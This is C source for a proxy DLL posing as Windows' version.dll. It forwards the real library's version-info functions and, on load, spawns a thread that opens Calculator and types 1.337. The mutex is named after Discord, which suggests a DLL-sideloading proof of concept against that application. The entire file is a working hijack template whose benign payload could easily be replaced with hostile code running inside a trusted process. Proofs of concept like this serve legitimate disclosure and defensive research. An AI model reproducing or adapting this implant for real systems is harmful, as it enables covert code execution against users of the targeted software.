#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>

#ifndef KEYEVENTF_KEYUP
#define KEYEVENTF_KEYUP 0x0002
#endif

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    PVOID ProcessParameters;
    PVOID Reserved4[3];
    PVOID AtlThunkSListPtr;
    PVOID Reserved5;
    ULONG Reserved6;
    PVOID Reserved7;
    ULONG Reserved8;
    ULONG AtlThunkSListPtr32;
    PVOID Reserved9[45];
    BYTE Reserved10[96];
    PVOID PostProcessInitRoutine;
    BYTE Reserved11[128];
    PVOID Reserved12[1];
    ULONG SessionId;
    ULONG NtGlobalFlag;
} PEB, *PPEB;



static HMODULE g_hOrigDll = NULL;
static volatile LONG g_lExecuted = 0;

typedef DWORD (WINAPI *pfnGetFileVersionInfoSizeW)(LPCWSTR, LPDWORD);
typedef DWORD (WINAPI *pfnGetFileVersionInfoSizeA)(LPCSTR, LPDWORD);
typedef BOOL (WINAPI *pfnGetFileVersionInfoW)(LPCWSTR, DWORD, DWORD, LPVOID);
typedef BOOL (WINAPI *pfnGetFileVersionInfoA)(LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL (WINAPI *pfnVerQueryValueW)(LPCVOID, LPCWSTR, LPVOID*, PUINT);
typedef BOOL (WINAPI *pfnVerQueryValueA)(LPCVOID, LPCSTR, LPVOID*, PUINT);
typedef DWORD (WINAPI *pfnVerLanguageNameW)(DWORD, LPWSTR, DWORD);
typedef DWORD (WINAPI *pfnVerLanguageNameA)(DWORD, LPSTR, DWORD);
typedef DWORD (WINAPI *pfnGetFileVersionInfoSizeExW)(DWORD, LPCWSTR, LPDWORD);
typedef BOOL (WINAPI *pfnGetFileVersionInfoExW)(DWORD, LPCWSTR, DWORD, DWORD, LPVOID);

static pfnGetFileVersionInfoSizeW pGetFileVersionInfoSizeW = NULL;
static pfnGetFileVersionInfoSizeA pGetFileVersionInfoSizeA = NULL;
static pfnGetFileVersionInfoW pGetFileVersionInfoW = NULL;
static pfnGetFileVersionInfoA pGetFileVersionInfoA = NULL;
static pfnVerQueryValueW pVerQueryValueW = NULL;
static pfnVerQueryValueA pVerQueryValueA = NULL;
static pfnVerLanguageNameW pVerLanguageNameW = NULL;
static pfnVerLanguageNameA pVerLanguageNameA = NULL;
static pfnGetFileVersionInfoSizeExW pGetFileVersionInfoSizeExW = NULL;
static pfnGetFileVersionInfoExW pGetFileVersionInfoExW = NULL;

BOOL LoadSystemDll() {
    if (g_hOrigDll) return TRUE;

    wchar_t szPath[MAX_PATH] = {0};
    if (!GetSystemDirectoryW(szPath, MAX_PATH)) return FALSE;
    
    lstrcatW(szPath, L"\\version.dll");

    g_hOrigDll = LoadLibraryW(szPath);
    if (!g_hOrigDll) return FALSE;

    pGetFileVersionInfoSizeW = (pfnGetFileVersionInfoSizeW)GetProcAddress(g_hOrigDll, "GetFileVersionInfoSizeW");
    pGetFileVersionInfoSizeA = (pfnGetFileVersionInfoSizeA)GetProcAddress(g_hOrigDll, "GetFileVersionInfoSizeA");
    pGetFileVersionInfoW = (pfnGetFileVersionInfoW)GetProcAddress(g_hOrigDll, "GetFileVersionInfoW");
    pGetFileVersionInfoA = (pfnGetFileVersionInfoA)GetProcAddress(g_hOrigDll, "GetFileVersionInfoA");
    pVerQueryValueW = (pfnVerQueryValueW)GetProcAddress(g_hOrigDll, "VerQueryValueW");
    pVerQueryValueA = (pfnVerQueryValueA)GetProcAddress(g_hOrigDll, "VerQueryValueA");
    pVerLanguageNameW = (pfnVerLanguageNameW)GetProcAddress(g_hOrigDll, "VerLanguageNameW");
    pVerLanguageNameA = (pfnVerLanguageNameA)GetProcAddress(g_hOrigDll, "VerLanguageNameA");
    pGetFileVersionInfoSizeExW = (pfnGetFileVersionInfoSizeExW)GetProcAddress(g_hOrigDll, "GetFileVersionInfoSizeExW");
    pGetFileVersionInfoExW = (pfnGetFileVersionInfoExW)GetProcAddress(g_hOrigDll, "GetFileVersionInfoExW");

    return TRUE;
}

__declspec(dllexport) DWORD WINAPI MyGetFileVersionInfoSizeW(LPCWSTR lpwstrFilename, LPDWORD lpdwHandle) {
    if (!LoadSystemDll() || !pGetFileVersionInfoSizeW) return 0;
    return pGetFileVersionInfoSizeW(lpwstrFilename, lpdwHandle);
}

__declspec(dllexport) DWORD WINAPI MyGetFileVersionInfoSizeA(LPCSTR lpstrFilename, LPDWORD lpdwHandle) {
    if (!LoadSystemDll() || !pGetFileVersionInfoSizeA) return 0;
    return pGetFileVersionInfoSizeA(lpstrFilename, lpdwHandle);
}

__declspec(dllexport) BOOL WINAPI MyGetFileVersionInfoW(LPCWSTR lpwstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {
    if (!LoadSystemDll() || !pGetFileVersionInfoW) return FALSE;
    return pGetFileVersionInfoW(lpwstrFilename, dwHandle, dwLen, lpData);
}

__declspec(dllexport) BOOL WINAPI MyGetFileVersionInfoA(LPCSTR lpstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {
    if (!LoadSystemDll() || !pGetFileVersionInfoA) return FALSE;
    return pGetFileVersionInfoA(lpstrFilename, dwHandle, dwLen, lpData);
}

__declspec(dllexport) BOOL WINAPI MyVerQueryValueW(LPCVOID pBlock, LPCWSTR lpwstrSubBlock, LPVOID *lplpBuffer, PUINT puLen) {
    if (!LoadSystemDll() || !pVerQueryValueW) return FALSE;
    return pVerQueryValueW(pBlock, lpwstrSubBlock, lplpBuffer, puLen);
}

__declspec(dllexport) BOOL WINAPI MyVerQueryValueA(LPCVOID pBlock, LPCSTR lpstrSubBlock, LPVOID *lplpBuffer, PUINT puLen) {
    if (!LoadSystemDll() || !pVerQueryValueA) return FALSE;
    return pVerQueryValueA(pBlock, lpstrSubBlock, lplpBuffer, puLen);
}

__declspec(dllexport) DWORD WINAPI MyVerLanguageNameW(DWORD wLang, LPWSTR szLang, DWORD cchLang) {
    if (!LoadSystemDll() || !pVerLanguageNameW) return 0;
    return pVerLanguageNameW(wLang, szLang, cchLang);
}

__declspec(dllexport) DWORD WINAPI MyVerLanguageNameA(DWORD wLang, LPSTR szLang, DWORD cchLang) {
    if (!LoadSystemDll() || !pVerLanguageNameA) return 0;
    return pVerLanguageNameA(wLang, szLang, cchLang);
}

__declspec(dllexport) DWORD WINAPI MyGetFileVersionInfoSizeExW(DWORD dwFlags, LPCWSTR lpwstrFilename, LPDWORD lpdwHandle) {
    if (!LoadSystemDll() || !pGetFileVersionInfoSizeExW) return 0;
    return pGetFileVersionInfoSizeExW(dwFlags, lpwstrFilename, lpdwHandle);
}

__declspec(dllexport) BOOL WINAPI MyGetFileVersionInfoExW(DWORD dwFlags, LPCWSTR lpwstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {
    if (!LoadSystemDll() || !pGetFileVersionInfoExW) return FALSE;
    return pGetFileVersionInfoExW(dwFlags, lpwstrFilename, dwHandle, dwLen, lpData);
}

void SendKey(WORD vk) {
    INPUT input = {0};
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = vk;
    SendInput(1, &input, sizeof(INPUT));
    Sleep(50);
    input.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &input, sizeof(INPUT));
    Sleep(50);
}

void OpenCalculatorWith1337() {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (CreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        Sleep(1500);
        
        SendKey('1');
        SendKey(VK_DECIMAL);
        SendKey('3');
        SendKey('3');
        SendKey('7');
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

DWORD WINAPI PayloadThread(LPVOID lpParam) {
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\DiscordCalc1337Mutex");
    
    if (hMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        ExitThread(0);
        return 0;
    }
    
    Sleep(1000);
    OpenCalculatorWith1337();
    
    CloseHandle(hMutex);
    ExitThread(0);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        if (InterlockedIncrement(&g_lExecuted) != 1) return TRUE;

        DisableThreadLibraryCalls(hinstDLL);
        LoadSystemDll();
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    else if (fdwReason == DLL_PROCESS_DETACH) {
        if (g_hOrigDll) {
            FreeLibrary(g_hOrigDll);
            g_hOrigDll = NULL;
        }
    }
    return TRUE;
}
